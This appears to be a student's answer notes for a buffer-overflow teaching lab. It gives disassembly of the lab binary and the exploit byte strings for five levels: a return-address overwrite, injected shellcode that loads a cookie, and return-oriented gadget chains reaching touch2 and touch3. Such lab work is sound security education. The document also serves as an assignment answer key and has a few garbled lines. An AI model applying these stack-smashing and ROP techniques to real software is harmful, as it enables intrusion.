@@ -1,0 +1,376 @@
+///////////////////////////////////////////
+///		Phase 1			///
+///////////////////////////////////////////
+
+
+-~* Level 1 *~-
+
+1 void test() 
+2 { 
+3 int val; 
+4 val = getbuf(); 
+5 printf("No exploit. Getbuf returned 0x%x\n", val); 
+6 }
+
+00000000004019c8 <test>:
+  4019c8:       48 83 ec 08             sub    $0x8,%rsp
+  4019cc:       b8 00 00 00 00          mov    $0x0,%eax
+  4019d1:       e8 76 fe ff ff          callq  40184c <getbuf>
+  4019d6:       89 c6                   mov    %eax,%esi
+  4019d8:       bf b8 30 40 00          mov    $0x4030b8,%edi
+  4019dd:       b8 00 00 00 00          mov    $0x0,%eax
+  4019e2:       e8 99 f2 ff ff          callq  400c80 <printf@plt>
+  4019e7:       48 83 c4 08             add    $0x8,%rsp
+  4019eb:       c3                      retq
+  4019ec:       0f 1f 40 00             nopl   0x0(%rax)
+
+000000000040184c <getbuf>:
+  40184c:       48 83 ec 18             sub    $0x18,%rsp
+  401850:       48 89 e7                mov    %rsp,%rdi
+  401853:       e8 32 02 00 00          callq  401a8a <Gets>
+  401858:       b8 01 00 00 00          mov    $0x1,%eax
+  40185d:       48 83 c4 18             add    $0x18,%rsp
+  401861:       c3                      retq
+  401862:       66 90                   xchg   %ax,%ax
+
+0000000000401864 <touch1>:
+  401864:       48 83 ec 08             sub    $0x8,%rsp
+  401868:       c7 05 8a 2c 20 00 01    movl   $0x1,0x202c8a(%rip)        # 6044fc <vlevel>
+  40186f:       00 00 00
+  401872:       bf f2 2f 40 00          mov    $0x402ff2,%edi
+  401877:       e8 d4 f3 ff ff          callq  400c50 <puts@plt>
+  40187c:       bf 01 00 00 00          mov    $0x1,%edi
+  401881:       e8 f3 03 00 00          callq  401c79 <validate>
+  401886:       bf 00 00 00 00          mov    $0x0,%edi
+  40188b:       e8 60 f5 ff ff          callq  400df0 <exit@plt>
+
+1 void touch1() 
+2 { 
+3 vlevel = 1; /* Part of validation protocol */ 
+4 printf("Touch1!: You called touch1()\n"); 
+5 validate(1); 
+6 exit(0); 
+7 }
+
+00 00 00 00 00 00 00 00 	//padding
+00 00 00 00 00 00 00 00 
+00 00 00 00 00 00 00 00 
+64 18 40 00 00 00 00 00		//adr of touch1
+
+-~* Level 2 *~-
+
+0000000000401890 <touch2>:
+  401890:       48 83 ec 08             sub    $0x8,%rsp
+  401894:       89 fe                   mov    %edi,%esi
+  401896:       c7 05 5c 2c 20 00 02    movl   $0x2,0x202c5c(%rip)        # 6044fc <vlevel>
+  40189d:       00 00 00
+  4018a0:       3b 3d 5e 2c 20 00       cmp    0x202c5e(%rip), %edi        # 604504 <cookie>
+  4018a6:       75 1b                   jne    4018c3 <touch2+0x33>
+  4018a8:       bf 18 30 40 00          mov    $0x403018,%edi
+  4018ad:       b8 00 00 00 00          mov    $0x0,%eax
+  4018b2:       e8 c9 f3 ff ff          callq  400c80 <printf@plt>
+  4018b7:       bf 02 00 00 00          mov    $0x2,%edi
+  4018bc:       e8 b8 03 00 00          callq  401c79 <validate>
+  4018c1:       eb 19                   jmp    4018dc <touch2+0x4c>
+  4018c3:       bf 40 30 40 00          mov    $0x403040,%edi
+  4018c8:       b8 00 00 00 00          mov    $0x0,%eax
+  4018cd:       e8 ae f3 ff ff          callq  400c80 <printf@plt>
+  4018d2:       bf 02 00 00 00          mov    $0x2,%edi
+  4018d7:       e8 4f 04 00 00          callq  401d2b <fail>
+  4018dc:       bf 00 00 00 00          mov    $0x0,%edi
+  4018e1:       e8 0a f5 ff ff          callq  400df0 <exit@plt>
+
+1 void touch2(unsigned val) 
+2 { 
+3 vlevel = 2; /* Part of validation protocol */ 
+4 if (val == cookie) { 
+5 printf("Touch2!: You called touch2(0x%.8x)\n", val); 
+6 validate(2); 
+7 } else { 
+8 printf("Misfire: You called touch2(0x%.8x)\n", val); 
+9 fail(2); 
+10 } 
+11 exit(0); 
+12 }
+
+Cookie 0x60b17d14
+48 c7 c7 14 7d b1 60 c3		//input allocated area, code to mov cookie into reg
+00 00 00 00 00 00 00 00		//padding
+00 00 00 00 00 00 00 00
+a8 56 65 55 00 00 00 00		//adr of rsp/code
+90 18 40 00 00 00 00 00		//adr of touch 2
+
+rsp: 0x556556a8
+Stack grows down (addresses decrease)
+
+0x556556c0   address of touch 2
+0x556556b8   address of code
+0x556556b0   padding
+paadding
+0x55 65 56 a8   code
+
+-~* Level 3 *~-
+cookie is in ascii
+each char of cookie has to correspond to some hex value
+e.g. have a, write 61
+do move thing
+find place to put address of code
+find place on stack
+
+disassembly
+padding
+address of code to put in
+address of touch 3
+hex representation of cookie
+
+1 /* Compare string to hex represention of unsigned value */ 
+2 int hexmatch(unsigned val, char *sval) 
+3 { 
+4 char cbuf[110]; 
+5 /* Make position of check string unpredictable */ 
+6 char *s = cbuf + random() % 100; 
+7 sprintf(s, "%.8x", val); 
+8 return strncmp(sval, s, 9) == 0; 
+9 }
+
+0000000000400c30 <strncmp@plt>:
+  400c30:       ff 25 fa 33 20 00       jmpq   *0x2033fa(%rip)        # 604030 <_GLOBAL_OFFSET_TABLE_+0x30>
+  400c36:       68 03 00 00 00          pushq  $0x3
+  400c3b:       e9 b0 ff ff ff          jmpq   400bf0 <_init+0x28>
+
+00000000004018e6 <hexmatch>:
+  4018e6:       41 54                   push   %r12
+  4018e8:       55                      push   %rbp
+  4018e9:       53                      push   %rbx
+  4018ea:       48 83 ec 70             sub    $0x70,%rsp
+  4018ee:       41 89 fc                mov    %edi,%r12d
+  4018f1:       48 89 f5                mov    %rsi,%rbp
+  4018f4:       e8 57 f4 ff ff          callq  400d50 <random@plt>
+  4018f9:       48 89 c1                mov    %rax,%rcx
+  4018fc:       48 ba 0b d7 a3 70 3d    movabs $0xa3d70a3d70a3d70b,%rdx
+  401903:       0a d7 a3
+  401906:       48 f7 ea                imul   %rdx
+  401909:       48 8d 04 0a             lea    (%rdx,%rcx,1),%rax
+  40190d:       48 c1 f8 06             sar    $0x6,%rax
+  401911:       48 89 ce                mov    %rcx,%rsi
+  401914:       48 c1 fe 3f             sar    $0x3f,%rsi
+  401918:       48 29 f0                sub    %rsi,%rax
+  40191b:       48 8d 04 80             lea    (%rax,%rax,4),%rax
+  40191f:       48 8d 04 80             lea    (%rax,%rax,4),%rax
+  401923:       48 c1 e0 02             shl    $0x2,%rax
+  401927:       48 29 c1                sub    %rax,%rcx
+  40192a:       48 8d 1c 0c             lea    (%rsp,%rcx,1),%rbx
+  40192e:       44 89 e2                mov    %r12d,%edx
+  401931:       be 0f 30 40 00          mov    $0x40300f,%esi
+  401936:       48 89 df                mov    %rbx,%rdi
+  401939:       b8 00 00 00 00          mov    $0x0,%eax
+  40193e:       e8 9d f4 ff ff          callq  400de0 <sprintf@plt>
+  401943:       ba 09 00 00 00          mov    $0x9,%edx
+  401948:       48 89 de                mov    %rbx,%rsi
+  40194b:       48 89 ef                mov    %rbp,%rdi
+  40194e:       e8 dd f2 ff ff          callq  400c30 <strncmp@plt>
+  401953:       85 c0                   test   %eax,%eax
+  401955:       0f 94 c0                sete   %al
+  401958:       0f b6 c0                movzbl %al,%eax
+  40195b:       48 83 c4 70             add    $0x70,%rsp
+  40195f:       5b                      pop    %rbx
+  401960:       5d                      pop    %rbp
+  401961:       41 5c                   pop    %r12
+  401963:       c3                      retq
+
+0000000000401964 <touch3>:
+  401964:       53                      push   %rbx
+  401965:       48 89 fb                mov    %rdi,%rbx
+  401968:       c7 05 8a 2b 20 00 03    movl   $0x3,0x202b8a(%rip)        # 6044fc <vlevel>
+  40196f:       00 00 00
+  401972:       48 89 fe                mov    %rdi,%rsi
+  401975:       8b 3d 89 2b 20 00       mov    0x202b89(%rip),%edi        # 604504 <cookie>
+  40197b:       e8 66 ff ff ff          callq  4018e6 <hexmatch>
+  401980:       85 c0                   test   %eax,%eax
+  401982:       74 1e                   je     4019a2 <touch3+0x3e>
+  401984:       48 89 de                mov    %rbx,%rsi
+  401987:       bf 68 30 40 00          mov    $0x403068,%edi		//Touch3! you called touch3
+  40198c:       b8 00 00 00 00          mov    $0x0,%eax
+  401991:       e8 ea f2 ff ff          callq  400c80 <printf@plt>
+  401996:       bf 03 00 00 00          mov    $0x3,%edi
+  40199b:       e8 d9 02 00 00          callq  401c79 <validate>
+  4019a0:       eb 1c                   jmp    4019be <touch3+0x5a>
+  4019a2:       48 89 de                mov    %rbx,%rsi
+  4019a5:       bf 90 30 40 00          mov    $0x403090,%edigdb 	//misfire
+  4019aa:       b8 00 00 00 00          mov    $0x0,%eax
+  4019af:       e8 cc f2 ff ff          callq  400c80 <printf@plt>
+  4019b4:       bf 03 00 00 00          mov    $0x3,%edi
+  4019b9:       e8 6d 03 00 00          callq  401d2b <fail>
+  4019be:       bf 00 00 00 00          mov    $0x0,%edi
+  4019c3:       e8 28 f4 ff ff          callq  400df0 <exit@plt>
+
+
+48 c7 c7 d0 56 65 55 c3		//disassembly mov $(address we put ascii representation of cookie) to rdi
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00		//padding
+a8 56 65 55 00 00 00 00		//address of rsp/code/disassembly
+64 19 40 00 00 00 00 00		//address of touch 3
+36 30 62 31 37 64 31 34 	//ascii hexrepresentation of cookie
+
+Cookie 0x60b17d14
+36 30 62 31 37 64 31 34
+
+d0		//hex representation of cookie
+c8		//address of touch3
+c0		//address of rsp/code
+b8		
+b0		//padding
+556556a8	//injected code
+
+1 void touch3(char *sval) 
+2 { 
+3 vlevel = 3; /* Part of validation protocol */ 
+4 if (hexmatch(cookie, sval)) { 
+printf("Touch3!: You called touch3(\"%s\")\n", sval); 
+6 validate(3); 
+7 } else { 
+8 printf("Misfire: You called touch3(\"%s\")\n", sval); 
+9 fail(3); 
+10 } 
+11 exit(0); 
+12 }
+
+
+
+
+///////////////////////////////////////////
+///		Phase 2			///
+///////////////////////////////////////////
+
+
+
+-~* Level 4 *~-
+Cookie 0x60b17d14
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00		//padding
+fb 19 40 00 00 00 00 00		//gadget 1
+14 7d b1 60 00 00 00 00		//cookie, value to pop
+09 1a 40 00 00 00 00 00		//gadget 2
+90 18 40 00 00 00 00 00		//touch2 address
+
+pop rax	//58 c3
+ret
+
+mov rax, rdi	//48 89 c7 c3
+ret
+
+0x4019f9+2
+0x401a07+2
+
+-~* Level 5 *~-
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00		//padding
+fb 19 40 00 00 00 00 00 	//
+40 00 00 00 00 00 00 00		//offset to add to rsp
+cb 1a 40 00 00 00 00 00
+96 1a 40 00 00 00 00 00
+40 1a 40 00 00 00 00 00
+e0 1a 40 00 00 00 00 00
+0e 1a 40 00 00 00 00 00
+2c 1a 40 00 00 00 00 00
+0e 1a 40 00 00 00 00 00
+64 19 40 00 00 00 00 00		//address of touch 3
+36 30 62 31 37 64 31 34 	//ascii hexrepresentation of cookie
+
+708		//hex representation of cookie
+700		//gadget 8
+f8		//gadget 7
+f0		//gadget 6
+e8		//gadget 5
+e0		//gadget 4
+d8		//gadget 3
+d0		//gadget 2
+c8		//value to add to rsp to get to hex rep of cookie
+c0		//gadget 1
+b8		//padding
+b0		//padding
+556556a8	//padding		//rsp
+
+//pop rax
+//58
+//0x4019fb
+00000000004019f9 <setval_327>:
+  4019f9:       c7 07 58 90 90 90       movl   $0x90909058,(%rdi)
+  4019ff:       c3                      retq
+
+//offset to add to rsp
+//0x40
+
+//mv eax -> ecx
+//89 c1
+//0x401acb
+0000000000401ac9 <addval_482>:
+  401ac9:       8d 87 89 c1 90 90       lea    -0x6f6f3e77(%rdi),%eax
+  401acf:       c3                      retq
+
+//mv ecx -> edx
+//89 ca
+//0x401a96
+0000000000401a93 <setval_464>:
+  401a93:       c7 07 d5 89 ca 90       movl   $0x90ca89d5,(%rdi)
+  401a99:       c3                      retq
+
+//mv edx -> esi
+//89 d6
+//0x401a40
+//includes instruction for testing dl and dl
+0000000000401a3e <setval_162>:
+  401a3e:       c7 07 89 d6 84 d2       movl   $0xd284d689,(%rdi)
+  401a44:       c3                      retq
+
+//mv rsp -> rax
+//48 89 e0
+//0x401ae0
+0000000000401ade <addval_340>:
+  401ade:       8d 87 48 89 e0 c3       lea    -0x3c1f76b8(%rdi),%eax
+  401ae4:       c3                      retq
+
+//mv rax -> rdi
+//48 89 c7
+//0x401a0e
+0000000000401a0d <getval_173>:
+  401a0d:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax
+  401a12:       c3                      retq
+
+//add rdi + rsi -> rax
+//0x401a2c
+0000000000401a2c <add_xy>:
+  401a2c:       48 8d 04 37             lea    (%rdi,%rsi,1),%rax
+  401a30:       c3                      retq
+
+//mv rax -> rdi
+//48 89 c7
+//0x401a0e
+0000000000401a0d <getval_173>:
+  401a0d:       b8 48 89 c7 c3          mov    $0xc3c78948,%eax
+  401a12:       c3                      retq
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
